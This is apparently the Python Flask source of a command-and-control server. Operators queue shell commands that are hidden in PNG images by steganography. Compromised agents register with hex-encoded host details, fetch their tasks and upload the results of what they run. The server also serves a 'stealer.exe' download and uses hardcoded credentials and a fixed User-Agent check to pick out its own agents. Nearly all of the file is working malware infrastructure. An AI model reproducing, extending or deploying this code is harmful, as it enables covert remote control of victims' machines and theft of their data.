from sqlalchemy import desc, func
from sqlalchemy.sql.functions import user
from flask import Flask, render_template, request, url_for, redirect, send_file, send_from_directory, safe_join, abort
# import flask_sqlalchemy
from flask_sqlalchemy import SQLAlchemy
from flaskext.mysql import MySQL
import flask_login
import base64
import os
from stegotest import *
import random

app = Flask(__name__)


if os.path.exists('database/c2.db'):
    pass
else:
    os.mknod("database/c2.db")

username = "pogChamp"
password = "BestC2Ever"
server = "127.0.0.1"

authToken = "areTheyDeadYet"
app.secret_key = 'My name is bobobo-bo bo-bobobo, but you can call me bobobo'

app.config["SQLALCHEMY_DATABASE_URI"] = "mysql+mysqlconnector://{}:{}@{}/c2".format(
    username, password, server)
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['TEMPLATES_AUTO_RELOAD'] = True

# The absolute path of the directory containing images for users to download
app.config["CLIENT_ENCODED_IMAGES"] = "/media/sf_c2/encImages/"

# The absolute path of the directory containing CSV files for users to download
app.config["CLIENT_STEALER"] = "/media/sf_c2/stealer/"


login_manager = flask_login.LoginManager()
login_manager.init_app(app)


db = SQLAlchemy(app)

password = 'Bobobo'

enc_image_num = 1


def main():
    size_db = os.path.getsize("database/c2.db")


class Commands(db.Model):

    id = db.Column(db.Integer, primary_key=True)
    cmds = db.Column(db.String(4096))
    done = db.Column(db.Boolean)


class Results(db.Model):

    id = db.Column(db.Integer, primary_key=True)
    results = db.Column(db.Text(4294000000))


class Users(db.Model):

    username = db.Column(db.String(64), primary_key=True)


# for flask login
class User(flask_login.UserMixin):
    pass


class Agents(db.Model):

    guid = db.Column(db.String(64), primary_key=True)
    user = db.Column(db.String(256))
    computer = db.Column(db.String(256))

# db.create_all()


def getUserList():
    users_unfiltered = Users.query.all()
    users = []
    for x in users_unfiltered:
        users.append(x.username)
    return users


def getGuidList():
    agents_unfiltered = Agents.query.all()
    agents = []
    for x in agents_unfiltered:
        agents.append(x.guid)
    return agents


@login_manager.user_loader
def user_loader(username):
    users = getUserList()
    if not(username) or username not in str(users):
        return
    user = User()
    user.id = username
    return user


@login_manager.request_loader
def request_loader(request):
    users = getUserList()
    username = request.form.get('username')
    if not(username) or username not in str(users):
        return
    user = Users()
    user.id = username
    user.is_authenticated = True
    return user


@app.route('/home')
@flask_login.login_required
def home():
    get_commands = Commands.query.all()
    if len(Results.query.all()) == 0:
        return render_template('index.html', returns=' \n ', commands=get_commands, name=flask_login.current_user.id)
    else:
        get_returns = Results.query.order_by(desc(Results.id))
        if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
            return render_template('index.html',
                                   returns=get_returns[0].results,
                                   commands=get_commands, name=flask_login.current_user.id)
        else:
            return render_template('redir.html')


@app.route('/register', methods=['POST'])
def register():
    req_data = request.data.decode("utf-8")[4:]
    hex_data = bytes.fromhex(req_data)
    ascii_data = hex_data.decode("ASCII")
    parsed_data = ascii_data.split('&')
    print(parsed_data)
    if parsed_data[0] == "auth=507261697365204c6f7264204265726e617264696e6921":
        guid = parsed_data[1][5:]
        user = parsed_data[2][5:]
        computer = parsed_data[3][9:]
        if guid not in getGuidList():
            save_agent = Agents(guid=guid, user=user, computer=computer)
            db.session.add(save_agent)
            db.session.commit()
            print("Agent saved to the db")
        return render_template('register.html')
    else:
        return render_template('redir.html')


@app.route("/get-image/<image_name>", methods=['GET', 'POST'])
def get_image(image_name):
    try:
        return send_from_directory(app.config["CLIENT_ENCODED_IMAGES"], path=image_name, as_attachment=True)
    except FileNotFoundError:
        abort(404)


@app.route("/get-stealer", methods=['GET', 'POST'])
def get_stealer():
    try:
        return send_from_directory(app.config["CLIENT_STEALER"], path="stealer.exe", as_attachment=True)
    except FileNotFoundError:
        abort(404)


@app.route('/commands', methods=['GET', 'POST'])
def getCommand():
    print("---------------------SECRET KEY-------------------")
    secretKey = str(request.headers.get('Authorization'))
    imageNum = str(request.headers.get('ImageNum'))
    print("---------------------PASS = " + secretKey + "-------------------")
    # guid = request.args.get('guid')
    if secretKey == password:
        print("---------------------User-Agent-------------------")
        userAgent = request.headers.get('User-Agent')
        if userAgent == "Myles920":
            print("---------------------DATA REQUEST-------------------")
            results = request.data.decode("utf-8")[4:]
            hex_data = bytes.fromhex(results)
            ascii_data = hex_data.decode("ASCII")
            print("ASCII Data: ", ascii_data)
            # add the result data to the db if it is not empty
            if len(ascii_data) > 0:
                new_results = Results(results=ascii_data)
                db.session.add(new_results)
                db.session.commit()
                print("Result data committed to the db!")

            # Check if someone is trying to exploit our server
            try:
                checker = int(imageNum)
            except:
                render_template('redir.html')

            task_queue = Commands.query.all()
            image_name = imageNum + "_diniFall.png"
            stealer = False
            if int(imageNum) == 0:
                stealer = True
            if os.path.exists("encImages/" + image_name) or int(imageNum) == 0:
                return render_template('commands.html', stealer=stealer, image_name=image_name)

            return render_template('redir.html')

    # if something goes wrong
    return render_template('redir.html')


@app.route('/create-task', methods=['POST'])
@flask_login.login_required
def create():
    cmd, cmd2, cmd3 = "", "", ""

    if request.form['task_1'] != None:
        cmd = request.form['task_1']
    if request.form['task_2'] != None:
        cmd2 = request.form['task_2']
    if request.form['task_3'] != None:
        cmd3 = request.form['task_3']

    new_cmds = Commands(cmds=cmd + " " + cmd2 + " " + cmd3, done=False)
    db.session.add(new_cmds)
    db.session.commit()

    cmds = [cmd, cmd2, cmd3]
    pic_num = random.randint(1, 5)
    print("PIC NUM: ", pic_num)
    img = "images/diniFall" + str(pic_num) + ".png"
    global enc_image_num
    print("Encoded Image Num: ", enc_image_num)
    encodeImage(cmds, img, enc_image_num)
    enc_image_num += 1

    return redirect(url_for('home'))


@app.route('/delete/<id>')
def delete(id):
    Commands.query.filter_by(id=int(id)).delete()
    db.session.commit()
    return redirect(url_for('home'))


@app.route('/')
def authenticate():
    auth = request.args.get('auth')
    # ensure that the user accessing the page should be here
    if auth != authToken:
        return render_template('redir.html')
    else:
        return render_template('login.html', auth=auth)


@app.route('/login', methods=['GET', 'POST'])
def login():
    # ensure that the user accessing the page should be here
    auth = request.form['authorization']
    if auth != authToken:
        print("[!] auth failed")
        return render_template('redir.html')

    # tru to get the necessary login info
    try:
        username = request.form['username']
        uPassword = request.form['password']
    except:
        print("[!] couldn't find all tokens")
        return render_template('redir.html')

    if uPassword == password:
        users = getUserList()
        print(users)
        if username not in users:
            new_user = Users(username=username)
            db.session.add(new_user)
            db.session.commit()

        user = User()
        user.id = username
        flask_login.login_user(user)
        # bring the user to the home page
        print("** before redirect to home")
        return redirect(url_for('home'))

    # information did not match
    print("****** before redir.html")
    return render_template('redir.html')


@app.route('/logout')
@flask_login.login_required
def logout():
    flask_login.logout_user()
    return render_template('login.html', auth=authToken)


@login_manager.unauthorized_handler
def unauthorized_handler():
    return render_template('unauth.html')


if __name__ == '__main__':
    main()
    app.run(host="0.0.0.0", debug=False)
    


# DEPRECATED CODE


# @app.route('/upload', methods=['GET'])
# def upload():
#     return render_template('img-commands.html')


# @app.route('/upload', methods=['GET', 'POST'])
# def upload_file():
#     # if request.method == 'GET':
#     #     return render_template('upload.html')
#     # elif request.method == 'POST':
#     imgFile = request.files['image']
#     new_img = CommandImages(image=imgFile, done=False)
#     db.add(new_img)
#     db.commit()
#     return render_template('img-commands.html', images=getImages())
